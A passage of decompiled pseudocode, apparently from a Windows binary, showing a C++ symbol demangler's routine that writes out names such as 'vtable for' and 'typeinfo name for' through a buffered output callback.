*(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x140009775:\n        pcVar36 = \"operator \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x1400097dd;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        if (*(arg1 + 0x170) != NULL) {\n            uStack200 = *(arg1 + 0x120);\n            *(arg1 + 0x120) = &stack0xffffffffffffff38;\n            uStack192 = *(arg1 + 0x170);\n        }\n        piVar19 = *(arg3 + 4);\n        if (*piVar19 != 4) {\n            uStack256 = 0x14000a336;\n            fcn.14000b4c0(arg1, 0x11, piVar19);\n            if (*(arg1 + 0x170) == 0) {\n                return;\n            }\n            *(arg1 + 0x120) = uStack200;\n            return;\n        }\n        uStack256 = 0x14000a8fa;\n        fcn.14000b4c0(arg1, 0x11, *(piVar19 + 4));\n        if (*(arg1 + 0x170) != 0) {\n            *(arg1 + 0x120) = uStack200;\n        }\n        if (arg1[0x108] == '<') {\n            uVar27 = 0x20;\n            *0x20 = &stack0xffffffffffffff00;\n            uStack256 = 0x14000b208;\n            unaff_RBX = arg1;\n            unaff_RSI = arg3;\n        }\n        else {\n            iVar15 = *(arg1 + 0x100);\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000b1ed;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar15 = 0;\n            }\n            *(arg1 + 0x100) = iVar15 + 1;\n            arg1[iVar15] = 0x3c;\n            arg1[0x108] = 0x3c;\n            uStack256 = 0x14000a95b;\n            fcn.14000b4c0(arg1, 0x11, *(*(arg3 + 4) + 0x18));\n            if (arg1[0x108] != '>') {\n                iVar15 = *(arg1 + 0x100);\n                if (iVar15 == 0xff) {\n                    arg1[0xff] = 0;\n                    uStack256 = 0x14000b1b1;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    iVar15 = 0;\n                }\n                *(arg1 + 0x100) = iVar15 + 1;\n                arg1[iVar15] = 0x3e;\n                arg1[0x108] = 0x3e;\n                return;\n            }\n            uVar27 = 0x20;\n            *0x20 = &stack0xffffffffffffff00;\n            uStack256 = 0x14000b1cc;\n            unaff_RBX = arg1;\n            unaff_RSI = arg3;\n        }\ncode_r0x000140004d10:\n        *(*0x20 + -8) = unaff_RSI;\n        *(*0x20 + -0x10) = unaff_RBX;\n        iVar15 = *(arg1 + 0x100);\n        if (iVar15 == 0xff) {\n            arg1[0xff] = 0;\n            uVar22 = *(arg1 + 0x118);\n            pcVar3 = *(arg1 + 0x110);\n            *(*0x20 + -0x40) = 0x140004d69;\n            (*pcVar3)(arg1, 0xff, uVar22);\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            iVar18 = 1;\n            iVar15 = 0;\n        }\n        else {\n            iVar18 = iVar15 + 1;\n        }\n        *(arg1 + 0x100) = iVar18;\n        arg1[iVar15] = uVar27;\n        arg1[0x108] = uVar27;\n        return;\n    case 0x1400097ed:\n        pcVar36 = \"TLS wrapper function for \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x140009855;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x140009865:\n        pcVar36 = \"TLS init function for \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x1400098cd;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x1400098dd:\n        uStack256 = 0x1400098eb;\n        fcn.14000b4c0(arg1, 0x11, *(arg3 + 4));\n        iVar15 = *(arg1 + 0x100);\n        if (iVar15 == 0xff) {\n            arg1[0xff] = 0;\n            uStack256 = 0x14000ab6b;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            iVar18 = 1;\n            iVar15 = 0;\n        }\n        else {\n            iVar18 = iVar15 + 1;\n        }\n        *(arg1 + 0x100) = iVar18;\n        arg1[iVar15] = 0x28;\n        arg1[0x108] = 0x28;\n        uVar22 = *(arg3 + 6);\n        goto code_r0x000140009918;\n    case 0x140009953:\n        if ((**(arg3 + 6) != 0x3b) || (**(*(arg3 + 6) + 6) != 0x3c)) goto code_r0x000140008400;\n        uStack256 = 0x140009977;\n        iVar14 = fcn.14000d000(arg1, 0x11, arg3);\n        if (iVar14 != 0) {\n            return;\n        }\n        uStack256 = 0x14000998f;\n        iVar14 = fcn.14000d390(arg1, 0x11, arg3);\n        if (iVar14 != 0) {\n            return;\n        }\n        iVar15 = *(arg3 + 4);\n        unaff_RDI = *(*(arg3 + 6) + 0x10);\n        iVar18 = *(*(arg3 + 6) + 0x18);\n        unaff_RBP = *(iVar18 + 0x10);\n        unaff_RSI = *(iVar18 + 0x18);\n        uStack256 = 0x1400099c3;\n        iVar14 = sub.msvcrt.dll_strcmp(**(iVar15 + 0x10), 0x1400ff64f);\n        if (iVar14 == 0) {\n            uStack256 = 0x1400099db;\n            fcn.14000ce50(arg1, 0x11, unaff_RDI);\n            uStack256 = 0x1400099eb;\n            fcn.14000c7c0(arg1, 0x11, iVar15);\n            uStack256 = 0x1400099fb;\n            fcn.14000ce50(arg1, 0x11, unaff_RBP);\n            pcVar36 = 0x1400ff652;\n            *0x20 = &stack0xffffffffffffff00;\n            uStack256 = 0x140009a0a;\n            unaff_RBX = arg1;\n        }\n        else {\n            pcVar36 = \"new \";\n            *0x20 = &stack0xffffffffffffff00;\n            uStack256 = 0x14000b3ef;\n            unaff_RBX = arg1;\n        }\n        goto code_r0x000140004de0;\n    case 0x140009a10:\n        pcVar36 = \"java resource \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x140009a75;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x140009a85:\n        iVar15 = *(arg3 + 4);\n        pcVar36 = \"operator\";\n        iVar30 = *(iVar15 + 0x10);\n        iVar18 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar18 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x140009af5;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar20 = 1;\n                iVar18 = 0;\n            }\n            else {\n                iVar20 = iVar18 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar20;\n            arg1[iVar18] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar18 = iVar20;\n        } while (pcVar36 != \"\");\n        pcVar36 = *(iVar15 + 8);\n        if (*pcVar36 + 0x9fU < 0x1a) {\n            if (iVar20 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000b229;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                pcVar36 = *(iVar15 + 8);\n                iVar20 = 0;\n            }\n            *(arg1 + 0x100) = iVar20 + 1;\n            arg1[iVar20] = 0x20;\n            arg1[0x108] = 0x20;\n        }\n        if (pcVar36[iVar30 + -1] == ' ') {\n            iVar30 = iVar30 + -1;\n        }\n        if (iVar30 == 0) {\n            return;\n        }\n        pcVar31 = pcVar36 + iVar30;\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000a2dd;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != pcVar31);\n        return;\n    case 0x140009b05:\n        uVar22 = *(arg3 + 6);\n        if (*(arg3 + 4) != 0) {\n            uStack256 = 0x140009b1c;\n            fcn.14000b4c0(arg1, 0x11, *(arg3 + 4));\n        }\n        iVar15 = *(arg1 + 0x100);\n        if (iVar15 == 0xff) {\n            arg1[0xff] = 0;\n            uStack256 = 0x14000ac21;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            iVar18 = 1;\n            iVar15 = 0;\n        }\n        else {\n            iVar18 = iVar15 + 1;\n        }\n        *(arg1 + 0x100) = iVar18;\n        arg1[iVar15] = 0x7b;\n        arg1[0x108] = 0x7b;\n        uStack256 = 0x140009b55;\n        fcn.14000b4c0(arg1, 0x11, uVar22);\n        iVar15 = *(arg1 + 0x100);\n        if (iVar15 == 0xff) {\n            arg1[0xff] = 0;\n            uStack256 = 0x14000abf2;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            iVar18 = 1;\n            iVar15 = 0;\n        }\n        else {\n            iVar18 = iVar15 + 1;\n        }\n        *(arg1 + 0x100) = iVar18;\n        arg1[iVar15] = 0x7d;\n        arg1[0x108] = 0x7d;\n        return;\n    case 0x140009b83:\n        pcVar36 = \"operator \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x140009bed;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        goto code_r0x000140008690;\n    case 0x140009bfd:\n        pcVar36 = \"VTT for \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x140009c65;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x140009c75:\n        pcVar36 = \"vtable for \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x140009cdd;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x140009ced:\n        pcVar36 = \"typeinfo fn for \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x140009d55;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x140009d65:\n        pcVar36 = \"typeinfo name for \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x140009dcd;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x140009ddd:\n        iVar15 = *(arg3 + 4);\n        uStack200 = *(arg1 + 0x128);\n        puVar6 = uStack200;\n        if (iVar15 != 0) {\n            *(arg1 + 0x128) = &stack0xffffffffffffff38;\n            uStack176 = *(arg1 + 0x120);\n            aiStack184[0] = 0;\n            uStack256 = 0x140009e2a;\n            uStack192 = arg3;\n            fcn.14000b4c0(arg1, 0x11, iVar15);\n            *(arg1 + 0x128) = uStack200;\n            if (aiStack184[0] != 0) {\n                return;\n            }\n            uVar27 = 0x20;\n            *0x20 = &stack0xffffffffffffff00;\n            uStack256 = 0x140009e51;\n            unaff_RBX = arg1;\n            unaff_RSI = arg3;\n            goto code_r0x000140004d10;\n        }\n        for (; (puVar6 != NULL && (*(puVar6 + 2) == 0)); puVar6 = *puVar6) {\n            if (*puVar6[1] < 0x2c) {\n                uVar35 = 1 << (*puVar6[1] & 0x3f);\n                if ((uVar35 & 0x8620e000000) == 0) {\n                    if ((uVar35 & 0x1c00000000) == 0) goto code_r0x00014000bead;\n                    uVar28 = arg1[0x108];\n                    if ((uVar28 & 0xfd) != 0x28) goto code_r0x00014000bf77;\n                    iVar15 = *(arg1 + 0x100);\n                    if (iVar15 != 0xff) goto code_r0x00014000bf93;\ncode_r0x00014000c07f:\n                    arg1[0xff] = 0;\n                    uStack80 = 0x14000c09b;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    iVar18 = 1;\n                    iVar15 = 0;\n                }\n                else {\n                    uVar28 = arg1[0x108];\ncode_r0x00014000bf77:\n                    iVar18 = *(arg1 + 0x100);\n                    iVar15 = iVar18;\n                    if (uVar28 == 0x20) {\ncode_r0x00014000bf87:\n                        if (iVar15 == 0xff) goto code_r0x00014000c07f;\n                    }\n                    else {\n                        if (iVar18 != 0xff) {\n                            iVar15 = iVar18 + 1;\n                            *(arg1 + 0x100) = iVar15;\n                            arg1[iVar18] = 0x20;\n                            arg1[0x108] = 0x20;\n                            goto code_r0x00014000bf87;\n                        }\n                        arg1[0xff] = 0;\n                        uStack80 = 0x14000c15c;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *arg1 = 0x20;\n                        iVar15 = 1;\n                        *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    }\ncode_r0x00014000bf93:\n                    iVar18 = iVar15 + 1;\n                }\n                *(arg1 + 0x100) = iVar18;\n                arg1[iVar15] = 0x28;\n                uVar22 = *(arg1 + 0x128);\n                arg1[0x108] = 0x28;\n                *(arg1 + 0x128) = 0;\n                uStack80 = 0x14000bfce;\n                fcn.14000c170(arg1, 0x11, uStack200, 0);\n                iVar15 = *(arg1 + 0x100);\n                if (iVar15 == 0xff) {\n                    arg1[0xff] = 0;\n                    uStack80 = 0x14000c12c;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *arg1 = 0x29;\n                    iVar18 = 1;\n                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    goto code_r0x00014000bef1;\n                }\n                iVar18 = iVar15 + 1;\n                *(arg1 + 0x100) = iVar18;\n                arg1[iVar15] = 0x29;\n                arg1[0x108] = 0x29;\n                goto joined_r0x00014000bffe;\n            }\ncode_r0x00014000bead:\n        }\n        uVar22 = *(arg1 + 0x128);\n        *(arg1 + 0x128) = 0;\n        uStack80 = 0x14000bedd;\n        fcn.14000c170(arg1, 0x11, uStack200, 0);\n        iVar18 = *(arg1 + 0x100);\njoined_r0x00014000bffe:\n        if (iVar18 == 0xff) {\n            arg1[0xff] = 0;\n            uStack80 = 0x14000c020;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *arg1 = 0x28;\n            arg1[0x108] = 0x28;\n            iVar15 = *(arg3 + 6);\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            *(arg1 + 0x100) = 1;\n            if (iVar15 != 0) goto code_r0x00014000bf10;\n            iVar30 = 1;\n        }\n        else {\ncode_r0x00014000bef1:\n            iVar30 = iVar18 + 1;\n            *(arg1 + 0x100) = iVar30;\n            arg1[iVar18] = 0x28;\n            arg1[0x108] = 0x28;\n            iVar15 = *(arg3 + 6);\n            if (iVar15 != 0) {\ncode_r0x00014000bf10:\n                uStack80 = 0x14000bf1d;\n                fcn.14000b4c0(arg1, 0x11, iVar15);\n                iVar30 = *(arg1 + 0x100);\n            }\n            if (iVar30 == 0xff) {\n                arg1[0xff] = 0;\n                uStack80 = 0x14000c0cc;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar15 = 1;\n                iVar30 = 0;\n                goto code_r0x00014000bf34;\n            }\n        }\n        iVar15 = iVar30 + 1;\ncode_r0x00014000bf34:\n        *(arg1 + 0x100) = iVar15;\n        arg1[iVar30] = 0x29;\n        arg1[0x108] = 0x29;\n        uStack80 = 0x14000bf5c;\n        fcn.14000c170(arg1, 0x11, uStack200, 1);\n        *(arg1 + 0x128) = uVar22;\n        return;\n    case 0x140009e7b:\n        iVar15 = *(arg1 + 0x100);\n        if (iVar15 == 0xff) {\n            arg1[0xff] = 0;\n            uStack256 = 0x14000abc3;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            iVar18 = 1;\n            iVar15 = 0;\n        }\n        else {\n            iVar18 = iVar15 + 1;\n        }\n        *(arg1 + 0x100) = iVar18;\n        arg1[iVar15] = 0x7e;\n        arg1[0x108] = 0x7e;\n        unaff_RSI = *(arg3 + 6);\n        goto code_r0x00014000b4c0;\n    case 0x140009ead:\n        piVar23 = *(arg1 + 0x128);\n        uStack176 = *(arg1 + 0x120);\n        *(arg1 + 0x128) = &stack0xffffffffffffff38;\n        uVar38 = 1;\n        aiStack184[0] = 0;\n        piVar21 = piVar23;\n        puVar34 = &stack0xffffffffffffff38;\n        uStack200 = piVar23;\n        if (piVar23 == NULL) {\n            uStack256 = 0x14000a5e5;\n            uStack192 = arg3;\n            fcn.14000b4c0(arg1, 0x11, *(arg3 + 6));\n            *(arg1 + 0x128) = 0;\n            if (aiStack184[0] != 0) {\n                return;\n            }\n        }\n        else {\n            do {\n                if (2 < *piVar21[1] - 0x19U) break;\n                if (*(piVar21 + 2) == 0) {\n                    if (3 < uVar38) goto code_r0x000140008400;\n                    uVar9 = *(piVar21 + 4);\n                    uVar10 = *(piVar21 + 1);\n                    uVar11 = *(piVar21 + 0xc);\n                    uVar35 = uVar38;\n                    uVar38 = uVar38 + 1;\n                    iVar15 = uVar35 * 0x20;\n                    *(&stack0xffffffffffffff38 + iVar15) = *piVar21;\n                    *(&stack0xffffffffffffff3c + iVar15) = uVar9;\n                    *(&stack0xffffffffffffff40 + iVar15) = uVar10;\n                    *(&stack0xffffffffffffff44 + iVar15) = uVar11;\n                    uVar9 = *(piVar21 + 2);\n                    uVar10 = *(piVar21 + 0x14);\n                    uVar11 = *(piVar21 + 3);\n                    uVar12 = *(piVar21 + 0x1c);\n                    *(&stack0xffffffffffffff38 + iVar15) = puVar34;\n                    puVar34 = &stack0xffffffffffffff38 + uVar35 * 0x20;\n                    *(arg1 + 0x128) = puVar34;\n                    *(&stack0xffffffffffffff48 + iVar15) = uVar9;\n                    *(&stack0xffffffffffffff4c + iVar15) = uVar10;\n                    *(&stack0xffffffffffffff50 + iVar15) = uVar11;\n                    *(&stack0xffffffffffffff54 + iVar15) = uVar12;\n                    *(piVar21 + 2) = 1;\n                }\n                piVar21 = *piVar21;\n            } while (piVar21 != NULL);\n            uStack256 = 0x140009f6d;\n            uStack192 = arg3;\n            fcn.14000b4c0(arg1, 0x11, *(arg3 + 6));\n            *(arg1 + 0x128) = piVar23;\n            if (aiStack184[0] != 0) {\n                return;\n            }\n            if (uVar38 != 1) {\n                uVar35 = uVar38 - 1;\n                puVar34 = &stack0xffffffffffffff38 + uVar35 * 0x20;\n                while( true ) {\n                    puVar6 = puVar34 + 8;\n                    puVar34 = puVar34 + -0x20;\n                    uStack256 = 0x140009fb5;\n                    fcn.14000b560(arg1, 0x11, *puVar6);\n                    if (uVar35 == 1) break;\n                    uVar35 = uVar35 - 1;\n                }\n            }\n        }\n        uStack256 = 0x14000a610;\n        fcn.14000c4f0(arg1, 0x11, arg3, *(arg1 + 0x128));\n        return;\n    case 0x140009fc3:\n        puVar34 = *(arg3 + 4);\n        if (arg3[6] == 0) {\n            return;\n        }\n        puVar33 = puVar34 + arg3[6];\n        iVar15 = *(arg1 + 0x100);\n        do {\n            uVar27 = *puVar34;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000a02d;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            puVar34 = puVar34 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = uVar27;\n            arg1[0x108] = uVar27;\n            iVar15 = iVar18;\n        } while (puVar34 != puVar33);\n        return;\n    case 0x14000a03d:\n        iVar15 = *(*(arg3 + 4) + 1);\n        puVar34 = **(arg3 + 4);\n        if (iVar15 == 0) {\n            return;\n        }\n        puVar33 = puVar34 + iVar15;\n        iVar15 = *(arg1 + 0x100);\n        do {\n            uVar27 = *puVar34;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000a0ad;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            puVar34 = puVar34 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = uVar27;\n            arg1[0x108] = uVar27;\n            iVar15 = iVar18;\n        } while (puVar33 != puVar34);\n        return;\n    }\ncode_r0x000140008468:\n    unaff_RSI = *(arg3 + 4);\ncode_r0x00014000b4c0:\n    if (((unaff_RSI != NULL) && (unaff_RSI[1] < 2)) && (iVar14 = *(arg1 + 0x134),  iVar14 < 0x401)) {\n        unaff_RSI[1] = unaff_RSI[1] + 1;\n        uVar22 = *(arg1 + 0x148);\n        *(arg1 + 0x134) = iVar14 + 1;\n        *(arg1 + 0x148) = &stack0xffffffffffffffd8;\n        uStack80 = 0x14000b51f;\n        fcn.1400083b0(arg1, 0x11, unaff_RSI);\n        *(arg1 + 0x148) = uVar22;\n        unaff_RSI[1] = unaff_RSI[1] - 1;\n        *(arg1 + 0x134) = *(arg1 + 0x134) + -1;\n        return;\n    }\n    *(arg1 + 0x130) = 1;\n    return;\njoined_r0x00014000afe7:\n    if (ppuVar32 == NULL) goto code_r0x00014000b24f;\n    if ((*ppuVar32 == puVar24) || ((*(arg1 + 0x148) != ppuVar32 && (*ppuVar32 == arg3)))) goto code_r0x00014000b00f;\n    ppuVar32 = ppuVar32[1];\n    goto joined_r0x00014000afe7;\n    while( true ) {\n        uVar9 = *piVar23;\n        uVar10 = *(piVar23 + 4);\n        uVar11 = *(piVar23 + 1);\n        uVar12 = *(piVar23 + 0xc);\n        *(arg1 + 0x128) = ppiVar26;\n        uVar39 = uVar39 + 1;\n        *ppiVar26 = uVar9;\n        *(ppiVar26 + 4) = uVar10;\n        *(ppiVar26 + 1) = uVar11;\n        *(ppiVar26 + 0xc) = uVar12;\n        uVar9 = *(piVar23 + 2);\n        uVar10 = *(piVar23 + 0x14);\n        uVar11 = *(piVar23 + 3);\n        uVar12 = *(piVar23 + 0x1c);\n        *ppiVar26 = piVar23;\n        *(ppiVar26 + 2) = uVar9;\n        *(ppiVar26 + 0x14) = uVar10;\n        *(ppiVar26 + 3) = uVar11;\n        *(ppiVar26 + 0x1c) = uVar12;\n        piVar23[1] = piVar19;\n        *(piVar23 + 2) = 0;\n        piVar19 = *(piVar19 + 4);\n        piVar23[3] = iVar15;\n        piVar23 = piVar23 + 4;\n        ppiVar26 = ppiVar26 + 4;\n        if (piVar19 == NULL) break;\ncode_r0x00014000ae3c:\n        iVar14 = *piVar19;\n        if ((0x35 < iVar14 - 0x1cU) || ((0x3400000000001fU >> (iVar14 - 0x1cU & 0x3f) & 1) == 0)) {\ncode_r0x0001400087f0:\n            if (iVar14 == 4) {\n                *(arg1 + 0x120) = &stack0xffffffffffffff28;\n                iStack216 = iVar15;\n                piStack208 = piVar19;\n            }\n            uStack256 = 0x140008825;\n            fcn.14000b4c0(arg1, 0x11, *(arg3 + 6));\n            if (*piVar19 == 4) {\n                *(arg1 + 0x120) = iStack216;\n            }\n            iVar14 = *(&stack0xffffffffffffff48 + (uVar39 - 1) * 0x20);\n            piVar23 = &stack0xffffffffffffff38 + (uVar39 - 1) * 4 * 8;\n            while( true ) {\n                if (iVar14 == 0) {\n                    iVar15 = *(arg1 + 0x100);\n                    if (iVar15 == 0xff) {\n                        arg1[0xff] = 0;\n                        uStack256 = 0x14000b08a;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                        iVar18 = 1;\n                        iVar15 = 0;\n                    }\n                    else {\n                        iVar18 = iVar15 + 1;\n                    }\n                    *(arg1 + 0x100) = iVar18;\n                    iVar18 = piVar23[1];\n                    arg1[iVar15] = 0x20;\n                    arg1[0x108] = 0x20;\n                    uStack256 = 0x1400088a3;\n                    fcn.14000b560(arg1, 0x11, iVar18);\n                }\n                if (piVar23 == &stack0xffffffffffffff38) break;\n                iVar14 = *(piVar23 + -2);\n                piVar23 = piVar23 + -4;\n            }\n            *(arg1 + 0x128) = uVar22;\n            return;\n        }\n        if (uVar39 == 4) break;\n    }\n    goto code_r0x000140008400;\ncode_r0x00014000b24f:\n    unaff_RDI = *(arg1 + 0x120);\n    *(arg1 + 0x120) = ppuVar25[1];\n    uStack256 = 0x14000b26c;\n    puVar24 = fcn.140004d80(arg1, puVar24);\n    if (puVar24 == NULL) {\ncode_r0x00014000b062:\n        *(arg1 + 0x120) = unaff_RDI;\n        goto code_r0x000140008400;\n    }\n    uVar38 = 1;\ncode_r0x00014000b023:\n    uVar29 = *puVar24;\n    if (uVar29 == 0x2f) {\n        iVar14 = 